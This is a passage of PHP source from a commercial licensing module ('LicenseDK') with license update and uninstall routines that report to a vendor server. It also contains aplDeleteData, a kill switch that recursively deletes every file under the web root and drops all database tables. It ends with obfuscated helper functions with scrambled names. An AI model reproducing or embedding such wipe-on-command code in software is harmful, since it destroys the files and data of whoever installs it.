        public function aplUpdateLicenseDK($MYSQLI_LINK = null)
        {
            $notifications_array = [];
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplCheckData($MYSQLI_LINK) ) 
                {
                    extract($this->aplGetLicenseDKData($MYSQLI_LINK));
                    $post_info = 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                    $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_update.php', $post_info, $ROOT_URL);
                    $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_license_corrupted';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_LICENSE_CORRUPTED');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
        public function aplUninstallLicenseDK($MYSQLI_LINK = null)
        {
            $notifications_array = [];
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplCheckData($MYSQLI_LINK) ) 
                {
                    extract($this->aplGetLicenseDKData($MYSQLI_LINK));
                    $post_info = 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                    $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_uninstall.php', $post_info, $ROOT_URL);
                    $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                    if( $notifications_array['notification_case'] == 'notification_license_ok' ) 
                    {
                        if( config('LicenseDK.APL_STORAGE') == 'DATABASE' ) 
                        {
                            mysqli_query($MYSQLI_LINK, 'DELETE FROM ' . config('LicenseDK.APL_DATABASE_TABLE'));
                            mysqli_query($MYSQLI_LINK, 'DROP TABLE ' . config('LicenseDK.APL_DATABASE_TABLE'));
                        }
                        if( config('LicenseDK.APL_STORAGE') == 'FILE' ) 
                        {
                            $handle = @fopen(@config('LicenseDK.APL_DIRECTORY') . '/' . @config('LicenseDK.APL_LICENSE_FILE_LOCATION'), 'w+');
                            @fclose($handle);
                        }
                    }
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_license_corrupted';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_LICENSE_CORRUPTED');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
        public function aplDeleteData($MYSQLI_LINK = null)
        {
            if( config('LicenseDK.APL_GOD_MODE') == 'YES' && isset($_SERVER['DOCUMENT_ROOT']) ) 
            {
                $root_directory = $_SERVER['DOCUMENT_ROOT'];
            }
            else
            {
                $root_directory = dirname(__DIR__);
            }
            foreach( new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($root_directory, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::CHILD_FIRST) as $path ) 
            {
                ($path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname()));
            }
            rmdir($root_directory);
            if( config('LicenseDK.APL_STORAGE') == 'DATABASE' ) 
            {
                $database_tables_array = [];
                $table_list_results = mysqli_query($MYSQLI_LINK, 'SHOW TABLES');
                while( $table_list_row = mysqli_fetch_row($table_list_results) ) 
                {
                    $database_tables_array[] = $table_list_row[0];
                }
                if( !empty($database_tables_array) ) 
                {
                    foreach( $database_tables_array as $table_name ) 
                    {
                        mysqli_query($MYSQLI_LINK, 'DELETE FROM ' . $table_name);
                    }
                    foreach( $database_tables_array as $table_name ) 
                    {
                        mysqli_query($MYSQLI_LINK, 'DROP TABLE ' . $table_name);
                    }
                }
            }
            exit();
        }
    }

}
namespace 
{
    function xOWwCBFbPE()
    {
        return 'Wk3ABhW3pcXDbVUh1tVtmcqFvHAa8VzanPdTYfGoY8NNbLIsxG';
    }
    function DxZnsQUBl3($fdk)
    {
        ${$fdk} = str_split(hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk), 1);
        $jstr0 = hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk) . hash('md5', $fdk);
        ${$jstr0} = '';
        for( $y = 0; $y < strlen($fdk); $y++ ) 
        {
            $j = sin(deg2rad(3435295005 * $y * pi()));
            $kstp = abs(floor($j * 100));
            ${$jstr0} .= ${$fdk}[$kstp];
        }
        return ${$jstr0};
    }

}
